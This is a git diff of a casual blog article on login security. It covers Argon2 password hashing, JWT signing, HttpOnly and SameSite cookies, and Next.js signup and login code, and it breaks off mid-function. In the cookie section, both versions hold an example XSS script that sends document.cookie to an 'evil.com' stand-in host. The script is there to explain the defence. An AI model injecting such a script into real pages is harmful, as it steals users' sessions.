@@ -1,789 +1,602 @@
 ---
-title: 'Modern Security Architecture with JWT + Argon2'
-summary: 'In the new paradigm of Next.js Server Actions, how can we build an authentication system that is both secure and elegant? This article deeply dissects the combination of JWT and Argon2, revealing the core value of object-oriented design in server-side logic.'
+title: 'The Real Story Behind Login — From Plaintext Passwords to Refresh Tokens'
+summary: 'You thought login was just "store password, check password"? Here is everything I learned the hard way — password hashing from MD5 to Argon2, JWT vs sessions, cookie security, and the refresh token mechanism that actually works in production.'
 category: 'Backend'
-tags: ['Next.js']
+tags: ['Next.js', 'JWT', 'Authentication', 'Security', 'Argon2']
 author: 'Max Zhang'
-date: '2026-02-27'
+date: '2024-03-20'
 ---
 
-> A comprehensive guide for developers who want to understand the "login" system from scratch
+It is 2 AM. You are in your bedroom, writing code.
 
-Have you ever wondered: why do some websites require you to log in again after a few days while others keep you logged in? How exactly are passwords "safely" stored? Why can't we just store them as plain text?
+A side project. A little blog. Some tool you decided to build because the existing ones annoyed you. The kind of project where you just want to get something running, fast. You build a signup page: a username field, a password field, a submit button. On the backend, you write a few lines that take the username and password and shove them into a database. You test it. It works.
 
-This article explains in plain language this seemingly simple but actually deep topic called authentication. We'll cover how passwords are stored, how login states are managed, how cookies are configured, and the refresh token mechanism essential for production environments. Whether you're a complete beginner learning web development or an experienced developer wanting a systematic review, you'll find something useful here.
+You get up, pour yourself a glass of water, and think that is done.
+
+Then you lie in bed scrolling your phone, and a thought hits you: **I just stored user passwords in plaintext. Is that... okay?**
+
+You roll over. Another thought: what if someone steals the database? You roll over again: after login, how does the server even know I already logged in last time? You sit up: what the hell is a Cookie? What are those three base64 segments in a JWT actually doing?
+
+You are not sleeping tonight.
+
+This article is what I wish someone had said to me at 2 AM that night. I am not going to throw RFC links at you. I am not going to say "decentralized token authentication architecture" like some textbook. I am just going to talk to you — like a friend who has been through this shit, over coffee — about passwords, login state, cookies, and all the things that will absolutely fuck you in production if you do not do them.
 
 ---
 
-## 1. Password Security: Why Is "Password + Salt" Not Enough?
+## One: Passwords. No, Hashing Is Not Enough.
 
-### 1.1 Let's Start with a Story: Why Can't We Store Passwords Directly?
+### Plaintext Is a Disaster Waiting to Happen
 
-You built a website and stored user passwords directly in the database:
+Look at this. Do not actually run this. Just imagine it:
 
 ```sql
--- Never do this!
 CREATE TABLE users (
     id INT PRIMARY KEY,
     username VARCHAR(50),
-    password VARCHAR(50)  -- Stored as plain text!
+    password VARCHAR(50)  -- plaintext. are you serious
 );
 ```
 
-This is a disaster waiting to happen—if the database gets hacked, all user passwords are exposed. Users often reuse passwords across multiple websites, so hackers can use these credentials to break into other accounts. The consequences are unthinkable.
+You run this. Users sign up. Passwords go straight into the database. Everything works. Then one day, the database gets stolen — maybe there was a SQL injection you missed, maybe the server got shelled, maybe a third-party service leaked a backup. It does not matter how. The result is the same: every user's password is now public.
 
-So passwords must never be stored in plain text. But how do we store them safely? This is where password hashing comes in.
+Your users reuse passwords. This is human nature. You cannot educate it away with a blog post about password managers. Your database leaks, the attacker takes those username-password combos and tries them on Taobao, WeChat, every bank — you know what happens next.
 
-### 1.2 What Is Hashing? Why Use It?
+Holy shit.
 
-**Hashing** is like putting an article through a paper shredder—the resulting scraps make it impossible to tell what was originally written. But as long as you use the same shredder on the same article, the scraps will always be identical.
+So you cannot store plaintext. But what do you store?
 
-Hash functions are the "paper shredders of the digital world":
+### Hashing: The Digital Paper Shredder
 
-- Accept input of any length
-- Output a fixed-length "garbled text"
-- Forward calculation is fast, but reverse engineering is almost impossible
+You walk into an office, feed a stack of paper into a shredder, press the button. Out comes a pile of strips. You cannot tell what the original document said. But — if you shred the same document with the same shredder, the strips look exactly the same every time.
 
-But hashing alone isn't enough. What if you and your neighbor both happen to use the same hash function and your passwords are both "123456"? Then the hash outputs would be identical. If hackers see two people with the same hash, they know the passwords are the same.
+**A hash function is that shredder.**
 
-### 1.3 Salting: From "One Dish for Everyone" to "Custom Dish Per Person"
-
-**Salting** is a simple idea: before hashing, add some "private seasoning" to each user's password.
-
-```typescript
-// Simple example: password + random salt
-const salt = generateRandomSalt() // e.g., "x7#k9@m2"
-const hash = sha256(password + salt) // 123456 + x7#k9@m2 = garbled text
+```
+"123456" + SHA256 → e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89a1b08eecf880ee9a6d8
+"123456" + SHA256 → e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89a1b08eecf880ee9a6d8
 ```
 
-This way, even if users have the same password, the salt values are different, so the final hash results are completely different. To crack these? Hackers would have to calculate each user separately, significantly increasing costs.
+Same input, same output, always. Reverse it? Impossible — just like reconstructing the original document from the shredded strips.
 
-### 1.4 The Evolution of Password Hashing Algorithms
+So you store the hash. When a user logs in, you hash their input, compare it with the database, and if they match, you let them in.
 
-#### 1.4.1 First Generation: MD5 + Salt (90s, Deprecated)
+Sounds perfect. But there is a catch: you and your neighbor both use SHA256, and your passwords both happen to be `123456`. The hash values in your database? Identical. An attacker sees two identical hashes and knows immediately: these two people share the same password. If the attacker's rainbow table already contains SHA256("123456"), boom — both accounts cracked.
+
+### Salting: Seasoning Each Dish Differently
+
+You run a restaurant. Everyone orders the same dish — braised pork belly. If you cook it the same way for everyone, every plate tastes identical. But now you add a personal touch: chili flakes for table 3, fermented black beans for table 7, Thai basil for table 12. Same dish, completely different flavors.
+
+**Salt is that personal touch.**
+
+```typescript
+const salt = crypto.randomBytes(16).toString('hex') // e.g. "a3f7b2c9..."
+const hash = sha256(password + salt) // "123456" + "a3f7b2c9..." = totally different
+```
+
+Each user gets a random salt. Even if two users pick the same password, their hashes end up completely different. The attacker now has to crack each hash individually — cost goes from N to N × each unique salt.
+
+Still not enough. Some hash functions are way too fast.
+
+### MD5: Death by Speed
+
+MD5 is from the 1990s. It was designed to be fast — because it was meant for file integrity checks, and fast was good. But for password storage? **Fast is a death sentence.**
+
+Modern GPUs — an RTX 4090, for instance — can compute billions of MD5 hashes per second. An attacker builds a dictionary of common passwords, pre-computes all the MD5 hashes (this is called a rainbow table), and when your database leaks, they do not even need to compute — they just look up the matches. Seconds. Done.
+
+**MD5 with salt in 2026 is effectively unencrypted.** Do not use it. If someone tells you MD5 is fine, send them this article and tell them to read it three times.
 
 ```sql
--- Each user gets a random salt, stored separately
+-- This might have been acceptable in 2005. In 2026 it is suicide.
 CREATE TABLE users (
-  id INT PRIMARY KEY,
-  username VARCHAR(50),
-  password_hash VARCHAR(32),  -- MD5 output is fixed 32 characters
-  salt VARCHAR(16)          -- Salt stored separately
+    id INT PRIMARY KEY,
+    username VARCHAR(50),
+    password_hash VARCHAR(32),  -- MD5
+    salt VARCHAR(16)
 );
 ```
 
-The problem with MD5: **It's too fast!**
+### bcrypt: The Deliberately Slow Lock
 
-Modern graphics cards (GPUs) can calculate hundreds of billions of MD5 hashes per second. Hackers can:
+bcrypt has one idea: **be slow.**
 
-1. Prepare a "common password dictionary"
-2. Pre-calculate all password MD5 values (rainbow tables)
-3. After database leak, directly match via lookup
+Imagine your front door lock takes a full second to open. For you? One second is nothing. For a burglar trying to pick locks on a million houses? One second × a million doors = game over.
 
-So MD5+salt today equals no encryption at all.
-
-#### 1.4.2 Second Generation: bcrypt (Mainstream in 2010s)
-
-bcrypt's revolutionary innovation is **deliberately slowing down the calculation**:
+bcrypt is that deliberately slow lock. It has a parameter called the cost factor. Set it to 12, and each hash takes about 250 milliseconds. A user signing up waits 250ms — they do not notice. An attacker trying to brute-force? Four attempts per second instead of four billion.
 
 ```typescript
-const hash = await bcrypt.hash(password, 12) // Cost factor 12
-
-// Output format: $2b$12$Salt(22 chars)Hash(31 chars)
-// bcrypt embeds the salt directly in the output, no need to store separately
+const hash = await bcrypt.hash(password, 12)
+// Output format: $2b$12$(22-char-salt).(31-char-hash)
+// The salt is baked into the output. No separate column needed.
 ```
 
-**bcrypt advantages:**
+bcrypt also naturally resists GPUs — its algorithm involves lots of memory access patterns that GPU parallel architectures handle poorly.
 
-- Adaptive cost: Control computation time through "cost factor"
-- Built-in salt: Salt is encoded directly in the hash
-- GPU resistant: Heavy memory access patterns don't suit parallel computing
+But bcrypt has limits. It relies primarily on time cost, offering limited protection against dedicated hardware (ASICs). And the memory usage is relatively fixed — you cannot dial it up flexibly.
 
-**bcrypt limitations:**
+### Argon2: Three-Dimensional Defense
 
-- Mainly relies on time cost, limited protection against specialized hardware (ASIC)
-- Relatively fixed memory usage, can't adjust flexibly
+In 2015, the cryptography community held a competition — the Password Hashing Competition. The winner was an algorithm called Argon2. Its core idea: **make it hard across three dimensions simultaneously, so no single piece of hardware can brute-force its way through.**
 
-#### 1.4.3 Third Generation: Argon2 (2015 Password Hashing Competition Champion)
+| Parameter   | What It Means   | Why It Matters                            |
+| ----------- | --------------- | ----------------------------------------- |
+| memoryCost  | Memory usage    | GPUs and ASICs hit memory bandwidth walls |
+| timeCost    | Iteration count | Each extra round doubles the time cost    |
+| parallelism | Thread count    | Caps how many threads you can throw at it |
 
-Argon2 is the most advanced password hashing algorithm today, winning the famous "Password Hashing Competition" in 2015.
-
-Its core idea is **simultaneously increasing difficulty across three dimensions**:
-
-| Parameter   | Meaning               | Why It Matters                                                       |
-| ----------- | --------------------- | -------------------------------------------------------------------- |
-| memoryCost  | Memory usage          | GPU/ASIC can be powerful, but memory bandwidth is still a bottleneck |
-| timeCost    | Number of iterations  | More iterations, multiplied time cost                                |
-| parallelism | Degree of parallelism | Limits parallel computing capability                                 |
+bcrypt makes one lock slow. Argon2 reinforces the lock, the door frame, and the wall.
 
 ```typescript
 import { hash, verify, argon2id } from 'argon2'
 
 async function hashPassword(password: string): Promise<string> {
   return await hash(password, {
-    type: argon2id, // Hybrid mode, balanced security and performance
-    memoryCost: 65536, // 64MB memory usage
+    type: argon2id, // Hybrid mode — best balance
+    memoryCost: 65536, // 64 MB memory
     timeCost: 3, // 3 iterations
-    parallelism: 4, // 4 parallel threads
-    hashLength: 32, // Output 32 bytes
+    parallelism: 4, // 4 threads
+    hashLength: 32,
   })
 }
 ```
 
-**Three modes of Argon2:**
+Argon2 has three variants:
 
-- `argon2d`: Maximum GPU resistance, but may be vulnerable to side-channel attacks
-- `argon2i`: Specifically resistant to side-channel attacks, weaker GPU protection
-- `argon2id` (**Recommended**): Hybrid of the first two, balanced for daily use
+- `argon2d`: Maximum GPU resistance, but theoretically vulnerable to side-channel attacks (power analysis).
+- `argon2i`: Maximum side-channel resistance, weaker against GPUs.
+- `argon2id` (recommended): Hybrid. For everyday use — you are not an arms dealer, nobody is bringing power analysis to your side project.
 
-#### 1.4.4 Evolution Comparison
+### The Evolution at a Glance
 
-| Feature               | MD5+Salt       | bcrypt              | Argon2                      |
-| --------------------- | -------------- | ------------------- | --------------------------- |
-| Era                   | 1990s          | 1999                | 2015                        |
-| Security Philosophy   | Fast hash      | Time cost           | Memory + time cost          |
-| GPU Resistance        | Extremely weak | Moderate            | Strong                      |
-| ASIC Resistance       | None           | Limited             | Strong                      |
-| Parameter Tuning      | Fixed          | Time cost           | Time + memory + parallelism |
-| Modern Recommendation | Never use      | Usable but not best | Preferred                   |
+| Algorithm | Era   | Strategy      | Anti-GPU | Anti-ASIC | Tuneable     | Verdict        |
+| --------- | ----- | ------------- | -------- | --------- | ------------ | -------------- |
+| MD5+salt  | 1990s | Fast hash     | None     | None      | Fixed        | Never use      |
+| bcrypt    | 1999  | Time cost     | Moderate | Limited   | Time         | Fine, not best |
+| Argon2    | 2015  | Memory + time | Strong   | Strong    | 3 dimensions | First choice   |
 
-### 1.5 Production Environment Recommendations
+### What to Use in Production
 
-**New projects**: Use Argon2 directly, no hesitation needed.
+**New project?** Argon2. Do not hesitate. Nobody gets to say "Argon2 is too new" — it won the competition a decade ago and the libraries are mature.
 
-**Existing bcrypt systems**: Migration isn't required, but new features should use Argon2. bcrypt itself hasn't been cracked, it's just that Argon2 is better.
+**Existing bcrypt system?** Migration is not mandatory. bcrypt is not broken. But new features should use Argon2. You can migrate gradually — new users get Argon2, existing users get re-hashed on their next login.
 
-**Key principle**: Cost parameters should be high enough (the slower the better within acceptable user experience), and regularly evaluate the impact of hardware advances on security.
+**What Argon2 does NOT solve:** If your user's password is `password123`, God himself cannot save you. Argon2 protects reasonably strong passwords from brute-force. It does not make weak passwords strong. Garbage in, garbage out.
 
 ---
 
-## 2. Session Management: What Exactly Is JWT?
+## Two: JWT. How Do You Prove You Are You?
 
-### 2.1 Without JWT, How Do We Store Login State?
+### After Login, How Does the Server Remember?
 
-Suppose you built a website. After a user logs in, how do you tell the server "this request is from Zhang San"?
+Alright. You figured out password storage. Users sign up and log in. You verify the password. You let them in. Then what?
 
-**Option 1: Store Sessions**
+The user clicks a button. The browser sends a brand new HTTP request to your server. HTTP is stateless — this request has no idea who sent the last one. You need a mechanism so every subsequent request can say "I am the person who logged in five minutes ago."
 
-The server assigns each logged-in user a session ID, stored in memory or database:
+Two paths.
 
-```
-User logs in → Server assigns Session ID = "abc123" → Returns to browser
-Subsequent requests → Browser carries Session ID → Server checks table to confirm identity
-```
+### Option One: Sessions (Traditional Stateful Login)
 
-Problem: Every server needs to store sessions, which becomes troublesome with multiple servers (requires shared session storage).
+You walk into a fancy restaurant. The host gives you a coat check ticket. A small numbered slip. You go to your table, order food, ask for the bill — the waiter asks for your ticket number, checks the system: yes, this guest is here.
 
-**Option 2: JWT (JSON Web Token)**
-
-JWT's approach: **Don't store anything, carry the identity information yourself!**
+That is a **Session.**
 
 ```
-User logs in → Server signs a "Token" → Returns to browser
-Subsequent requests → Browser carries Token → Server verifies Token authenticity
+User logs in → Server generates Session ID = "abc123" → sends it to browser (usually as a Cookie)
+Every subsequent request → Browser sends the Session ID → Server looks it up: "abc123 = Max, let him through"
 ```
 
-The Token contains user information; the server only needs to verify the signature to confirm identity, no table lookup needed.
+Sessions are simple. The server has full control — you want to kick someone out? Delete their session row. The downside: the server has to store state. Ten servers? User logs in on server A, next request hits server B — server B has no idea what "abc123" is. You need shared session storage (Redis, etc.), and that is an operational headache.
 
-### 2.2 What Does JWT Look Like?
+### Option Two: JWT (Carry Your Own ID)
 
-A JWT looks like this (split into three parts, separated by dots):
+You are at a train station. The ticket inspector does not call headquarters to ask "who is this person?" You pull out your ID card. The inspector checks — photo matches, hologram is real, official seal is there. Done. You are through.
+
+That is a **JWT (JSON Web Token).**
 
 ```
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJuYW1lIjoi5byg5LiJIn0.d1a2b3c4d5e6f7g8h9i0
-↑ Header                      ↑ Payload                       ↑ Signature
+User logs in → Server signs a Token → sends it to browser
+Every subsequent request → Browser sends the Token → Server verifies the signature → reads user info from the Token
 ```
 
-- **Header**: Records which algorithm is used for signing
-- **Payload**: Stores user information (not encrypted! Just Base64 encoded)
-- **Signature**: Signs the first two parts with a key, ensuring no one can forge it
+No lookup table. No shared state. The Token carries user information. The only job on the server side: verify "was this Token signed by me, and has anyone tampered with it?"
 
-> **Note**: Content in the Payload is just Base64 encoded, not encrypted. So don't put sensitive information (like passwords) in JWT—it's like plaintext!
+### What a JWT Looks Like
 
-### 2.3 JWT Algorithm Selection: HS256 or RS256?
+Three segments, separated by dots. Like this:
 
-JWT supports two signing algorithms:
+```
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJuYW1lIjoibWF4In0.d1a2b3c4d5e6f7g8h9i0...
+    ↑ Header                     ↑ Payload                     ↑ Signature
+```
 
-**Symmetric Algorithm (HS256)**:
+**Header:** Which algorithm signed this? (`{"alg": "RS256"}`)
 
-- Same key for signing and verifying
-- Fast, suitable for single service
-- **Problem**: Clients can also use this key to verify JWT, higher key leakage risk
+**Payload:** User info. (`{"userId": "123", "name": "max"}`)
 
-**Asymmetric Algorithm (RS256)**:
+**Signature:** A cryptographic signature over the first two segments. Change a single character in the Token and the signature no longer matches.
 
-- Sign with private key, verify with public key
-- Private key kept secret on server, public key can be distributed
-- More secure, suitable for distributed systems
+Critical reminder: **the Payload is NOT encrypted.** It is Base64-encoded. Base64 is encoding, not encryption. Anyone can decode it. Never put passwords, social security numbers, or credit card numbers in a JWT payload. That is basically posting them on a billboard.
+
+### HS256 vs RS256?
+
+JWT supports two families of algorithms:
+
+**Symmetric (HS256):** Same key signs and verifies. Like your house key — the same key locks and unlocks. Fast, but in a distributed system, every server that needs to verify tokens must hold this key. The exposure surface multiplies with every server.
+
+**Asymmetric (RS256):** Private key signs, public key verifies. Like your handwritten signature — only you can sign, but anyone can check your handwriting. You can hardcode the public key in the frontend. It leaks? Who cares — it can only verify, not sign.
+
+**For production, use RS256.** No debate.
 
 ```typescript
-import { jwtVerify, SignJWT } from 'jose'
+import { SignJWT, jwtVerify } from 'jose'
 
-class AuthService {
-  // Generate Token
-  async generateToken(payload: any): Promise<string> {
-    return await new SignJWT(payload)
-      .setProtectedHeader({ alg: 'RS256' }) // Must explicitly specify algorithm
-      .setIssuedAt() // Issued time
-      .setExpirationTime('7d') // Expires in 7 days
-      .sign(privateKey) // Sign with private key
-  }
+// Sign with private key
+const token = await new SignJWT({ userId: '123', name: 'max' })
+  .setProtectedHeader({ alg: 'RS256' })
+  .setIssuedAt()
+  .setExpirationTime('7d')
+  .sign(privateKey)
 
-  // Verify Token
-  async verifyToken(token: string): Promise<any> {
-    try {
-      const { payload } = await jwtVerify(token, publicKey) // Verify with public key
-      return payload
-    } catch (error) {
-      return null // Verification failed
-    }
-  }
-}
+// Verify with public key
+const { payload } = await jwtVerify(token, publicKey)
+// payload = { userId: '123', name: 'max' }
 ```
 
-### 2.4 Three Disadvantages of JWT You Must Know
+### Three Problems with JWT You Cannot Ignore
 
-JWT sounds great, but there are three pitfalls:
+JWTs sound great. Here is what they do not tell you.
 
-1. **What if the Token is Leaked?**
-   - Once the Token is stolen, hackers can use it to access the system
-   - Server can't actively invalidate Token (unless using a blacklist)
-   - Solution: Short-term Token + refresh mechanism
+**Problem One: Token Leakage**
 
-2. **What if the Token Gets Too Large?**
-   - Although Payload isn't encrypted, it shouldn't be too large
-   - Every request carries the entire Token, increasing network overhead
-   - Solution: Only store necessary information, don't stuff everything in
+The Token lives in the browser. If an XSS attack grabs it, or you are on public WiFi and someone does a man-in-the-middle — the attacker is now you. They can do anything you can do until the Token expires.
 
-3. **How to Revoke Tokens?**
-   - JWT's design philosophy is "stateless," but in practice we always need revocation capability
-   - Solution: Refresh tokens + blacklist, or Redis stores revoked jti
+And here is the worst part: **the server cannot force a JWT to stop working.** JWTs are stateless — the server stores nothing, so there is nothing to "revoke." Expiry is the only failure mode.
+
+The fix? Two-token refresh mechanism. But the principle is simple: never let a single Token live too long.
+
+**Problem Two: Token Bloat**
+
+Every request carries the entire JWT. If you stuff the payload — user permissions list, recent browsing history, avatar URL — every HTTP request bloats by hundreds of bytes, multiplied by 20 API calls per page load.
+
+Payload: keep it to userId and name. Nothing else.
+
+**Problem Three: Revocation Is a Lie**
+
+JWT's design philosophy is "self-contained and stateless." But in production, you almost always need the ability to revoke — the user changed their password, the old Token must die. Your choices:
+
+- Maintain a blocklist (violates the stateless ideal).
+- Very short expiry + refresh mechanism (this is the right answer).
+
+### What JWT Does NOT Solve
+
+- JWT does **not** prevent XSS — the payload is plaintext readable in the browser.
+- JWT does **not** prevent man-in-the-middle — you need HTTPS for that.
+- JWT does **not** handle authorization — it proves "who you are," not "what you are allowed to do."
 
 ---
 
-## 3. Cookie Strategy: The Tag Team of HttpOnly and SameSite
+## Three: Cookies. How to Send Tokens Without Getting Robbed.
 
-### 3.1 How Do We Send JWT to the Server?
+### Cookie vs LocalStorage
 
-The server signed a JWT, but how does the browser send it back in subsequent requests?
+You signed a JWT. Now: how does the browser send it back on subsequent requests?
 
-**Option 1: Store in Cookie** (The approach we use)
-**Option 2: Store in LocalStorage, pass via Authorization header**
+**Option A: Cookie.** The browser automatically attaches it to every request. Zero code.
 
-Both approaches have pros and cons:
+**Option B: LocalStorage.** You manually add `Authorization: Bearer xxx` to every fetch.
 
-| Approach     | Pros                                    | Cons                                        |
-| ------------ | --------------------------------------- | ------------------------------------------- |
-| Cookie       | Auto-sent, with HttpOnly to prevent XSS | Subject to CSRF attacks                     |
-| LocalStorage | Not subject to CSRF                     | Need to manually add header on each request |
+|                | Cookie             | LocalStorage                               |
+| -------------- | ------------------ | ------------------------------------------ |
+| Auto-attached  | Yes                | No (manual)                                |
+| JS-readable    | By default, yes    | By default, yes                            |
+| XSS-resistant  | With HttpOnly: yes | **Cannot** (XSS reads localStorage freely) |
+| CSRF-resistant | Needs SameSite     | Naturally immune                           |
+| Best for       | Web apps           | SPA + separate API                         |
 
-### 3.2 Why Use HttpOnly?
+Pick your poison. Cookie + HttpOnly at least prevents XSS scripts from stealing the Token. CSRF can be mitigated with SameSite.
 
-XSS (Cross-Site Scripting) is a major threat to web security. Hackers inject JavaScript code into your website to read users' cookies, then send them to their own server.
+### HttpOnly: Wallet, Inside Pocket
+
+You are at a crowded market. Wallet in your jacket's outer pocket or inside pocket?
+
+Outer pocket: a pickpocket grabs it in half a second. Inside pocket: they need to unbutton your coat first — too conspicuous.
+
+HttpOnly is that inside pocket. It is a Cookie attribute. Set it, and **JavaScript running in the browser cannot read this Cookie at all.**
 
 ```html
-<!-- Malicious comment contains this code -->
+<!-- Malicious script injected into your page -->
 <script>
-  // Read Token from Cookie
-  const token = document.cookie
-  // Send to hacker's server
-  fetch('https://evil.com/steal?cookie=' + token)
+  console.log(document.cookie)
+  // If auth_token has HttpOnly,
+  // this only sees non-HttpOnly cookies.
+  // The auth token is invisible to JS.
+  fetch('https://evil.com/steal?data=' + document.cookie)
 </script>
 ```
 
-HttpOnly's role: Let JavaScript completely unable to read this cookie!
+XSS scripts cannot steal what they cannot read. It does not prevent XSS — it prevents XSS from also stealing your login. Defense in depth.
 
-```typescript
-cookieStore.set('token', jwtToken, {
-  httpOnly: true, // With this, JavaScript can't read it
-  secure: true, // Only sent over HTTPS
-  sameSite: 'strict', // Prevent CSRF
-  maxAge: 7 * 24 * 60 * 60, // 7 days
-  path: '/',
-})
-```
+### SameSite: Only Show Your ID at Your Bank
 
-### 3.3 Why Use SameSite?
+You are on coffee shop WiFi. You logged into your online banking earlier — the session Cookie is still in your browser. You accidentally click a link that says "Claim your free Starbucks gift card." That link actually sends a transfer request to your bank.
 
-What's CSRF (Cross-Site Request Forgery)? Imagine:
+Your browser, being helpful, automatically attaches the Cookie. The bank sees the Cookie — "oh, this person is logged in" — and processes the transfer. Money gone.
 
-1. You're logged into a bank website but haven't logged out
-2. You casually click a link in an email
-3. That link actually sends a transfer request to the bank
-4. Browser automatically carries the Cookie, bank thinks it's your legitimate request
+This is **CSRF (Cross-Site Request Forgery).** And holy fuck, is it real.
 
-SameSite solves this:
+SameSite exists to fix this. It tells the browser: only send this Cookie under certain conditions.
 
-| Value    | Behavior                               | Explanation                       |
-| -------- | -------------------------------------- | --------------------------------- |
-| `strict` | Only send Cookie on same-site requests | Most secure, but poor UX          |
-| `lax`    | Same-site + navigation requests        | Balance of security and usability |
-| `none`   | Send on any request                    | Needs to be paired with Secure    |
+| SameSite Value | Behavior                                                                                  |
+| -------------- | ----------------------------------------------------------------------------------------- |
+| `strict`       | Only send Cookie on same-site requests (external links? no Cookie)                        |
+| `lax`          | Same-site + navigational GET requests from external links (POST from external? no Cookie) |
+| `none`         | Send on everything (must also set `Secure`)                                               |
 
-**`sameSite: 'strict'` is the most secure**, but if you click an external link, since it's a "navigation request," the Cookie won't be sent, which might cause users to see "not logged in" right after logging in. So many websites use `lax`.
+`strict` is most secure, but the UX can be annoying — a user clicks your link from Twitter, arrives with no Cookie, and sees "Please log in." They were literally just logged in. It feels broken. Most sites use `lax` as a compromise.
 
-### 3.4 Complete Cookie Configuration Example
+### The Complete Cookie Configuration
 
 ```typescript
 import { cookies } from 'next/headers'
 
-async function login(name: string, password: string) {
-  // ... validation logic ...
+const cookieStore = await cookies()
 
-  // Sign JWT
-  const token = await authService.generateToken({
-    userId: user.id,
-    name: user.name,
-  })
-
-  // Set Cookie - Next.js 15 needs await
-  const cookieStore = await cookies()
-
-  cookieStore.set('auth_token', token, {
-    httpOnly: true, // Prevent XSS reading
-    secure: process.env.NODE_ENV === 'production', // HTTPS required in production
-    sameSite: 'lax', // Prevent CSRF, but allow navigation requests
-    maxAge: 60 * 60 * 24 * 7, // 7 days (in seconds)
-    path: '/', // Works site-wide
-  })
-}
+cookieStore.set('auth_token', token, {
+  httpOnly: true, // Anti-XSS
+  secure: process.env.NODE_ENV === 'production', // HTTPS only in prod
+  sameSite: 'lax', // Anti-CSRF
+  maxAge: 60 * 60 * 24 * 7, // 7 days
+  path: '/', // Whole site
+})
 ```
+
+Three attributes. All required:
+
+- `httpOnly: true` → Without this, your Token is one injected `<script>` away from being stolen.
+- `sameSite: 'lax'` → Without this, you log into your bank, click a link, and your money is gone.
+- `secure: true` → Without this, the guy on the coffee shop WiFi reads your Cookie in plaintext.
 
 ---
 
-## 4. Complete Implementation: From Registration to Logout
+## Four: The Full Flow — Signup to Signout
 
-### 4.1 User Registration: The Safe Starting Point
+Enough theory. Let us wire everything together.
 
-Registration is the first gate users pass through when entering the system; we need to guard it well:
+### Signup
 
 ```typescript
-import { hash, verify, argon2id } from 'argon2'
+import { hash, argon2id } from 'argon2'
 import { z } from 'zod'
 
-// Define input validation rules first
 const registerSchema = z.object({
   name: z
     .string()
     .min(2, 'Username must be at least 2 characters')
-    .max(50, 'Username max 50 characters')
-    .regex(/^[a-zA-Z0-9_]+$/, 'Username can only contain letters, numbers, underscores'),
+    .max(50)
+    .regex(/^[a-zA-Z0-9_]+$/, 'Letters, numbers, underscores only'),
   password: z
     .string()
     .min(8, 'Password must be at least 8 characters')
-    .max(128, 'Password max 128 characters')
-    .regex(/[A-Z]/, 'Password must contain uppercase letter')
-    .regex(/[a-z]/, 'Password must contain lowercase letter')
-    .regex(/[0-9]/, 'Password must contain number'),
+    .max(128)
+    .regex(/[A-Z]/, 'Must contain an uppercase letter')
+    .regex(/[a-z]/, 'Must contain a lowercase letter')
+    .regex(/[0-9]/, 'Must contain a number'),
 })
 
-class AuthService {
-  /**
-   * Register new user
-   */
-  async register(name: string, password: string): Promise<IDataResult<boolean>> {
-    try {
-      // 1. Input validation
-      const validationResult = registerSchema.safeParse({ name, password })
-      if (!validationResult.success) {
-        return {
-          code: -1,
-          message: validationResult.error.errors[0].message,
-          data: false,
-        }
-      }
-
-      // 2. Check if username already exists
-      const existingUser = await this.prisma.user.findFirst({
-        where: { name },
-      })
-
-      if (existingUser) {
-        return {
-          code: -1,
-          message: 'Username already taken',
-          data: false,
-        }
-      }
-
-      // 3. Generate secure password hash with Argon2
-      const hashedPassword = await hash(password, {
-        type: argon2id,
-        memoryCost: 65536, // 64MB
-        timeCost: 3, // 3 iterations
-        parallelism: 4, // 4 threads
-        hashLength: 32,
-      })
-
-      // 4. Create user record
-      await this.prisma.user.create({
-        data: {
-          name,
-          password: hashedPassword, // Only store hash, never plaintext!
-        },
-      })
-
-      return {
-        code: 0,
-        message: 'Registration successful',
-        data: true,
-      }
-    } catch (error) {
-      console.error('Registration failed:', error)
-      return {
-        code: -1,
-        message: 'Registration failed, please try again later',
-        data: false,
-      }
-    }
+async function register(name: string, password: string) {
+  // 1. Validate input — Zod does runtime checks
+  const result = registerSchema.safeParse({ name, password })
+  if (!result.success) {
+    return { code: -1, message: result.error.errors[0].message }
   }
+
+  // 2. Check for duplicates
+  const exists = await prisma.user.findFirst({ where: { name } })
+  if (exists) {
+    return { code: -1, message: 'Username already taken' }
+  }
+
+  // 3. Hash with Argon2
+  const hashedPassword = await hash(password, {
+    type: argon2id,
+    memoryCost: 65536,
+    timeCost: 3,
+    parallelism: 4,
+    hashLength: 32,
+  })
+
+  // 4. Store only the hash. Never the plaintext.
+  await prisma.user.create({
+    data: { name, password: hashedPassword },
+  })
+
+  return { code: 0, message: 'Signup successful' }
 }
 ```
 
-### 4.2 User Login: Three-Factor Verification
+### Login
 
-The login flow needs to verify three things:
+Login adds one step beyond signup: after verifying the password, sign a JWT and set a Cookie.
 
 ```typescript
-class AuthService {
-  /**
-   * User login
-   */
-  async login(name: string, password: string): Promise<IDataResult<LoginResult>> {
-    try {
-      // 1. Find user
-      const user = await this.prisma.user.findFirst({
-        where: { name },
-      })
-
-      if (!user) {
-        // Note: Return vague error message to prevent user enumeration
-        return {
-          code: -1,
-          message: 'Invalid username or password',
-          data: { user: null },
-        }
-      }
-
-      // 2. Verify password (Argon2's verify method handles salt automatically)
-      const isPasswordValid = await verify(user.password, password)
-
-      if (!isPasswordValid) {
-        return {
-          code: -1,
-          message: 'Invalid username or password',
-          data: { user: null },
-        }
-      }
-
-      // 3. Generate JWT
-      const token = await this.generateToken({
-        userId: user.id,
-        name: user.name,
-      })
-
-      // 4. Set Cookie
-      const cookieStore = await cookies()
-      cookieStore.set('auth_token', token, {
-        httpOnly: true,
-        secure: process.env.NODE_ENV === 'production',
-        sameSite: 'lax',
-        maxAge: 60 * 60 * 24 * 7, // 7 days
-        path: '/',
-      })
-
-      return {
-        code: 0,
-        message: 'Login successful',
-        data: {
-          user: {
-            id: user.id,
-            name: user.name,
-          },
-        },
-      }
-    } catch (error) {
-      console.error('Login failed:', error)
-      return {
-        code: -1,
-        message: 'Login failed, please try again later',
-        data: { user: null },
-      }
-    }
+async function login(name: string, password: string) {
+  // 1. Find the user
+  const user = await prisma.user.findFirst({ where: { name } })
+  if (!user) {
+    // Note: do NOT say "user not found" vs "wrong password"
+    return { code: -1, message: 'Invalid username or password' }
   }
+
+  // 2. Verify the password — Argon2's verify handles salt automatically
+  const isValid = await verify(user.password, password)
+  if (!isValid) {
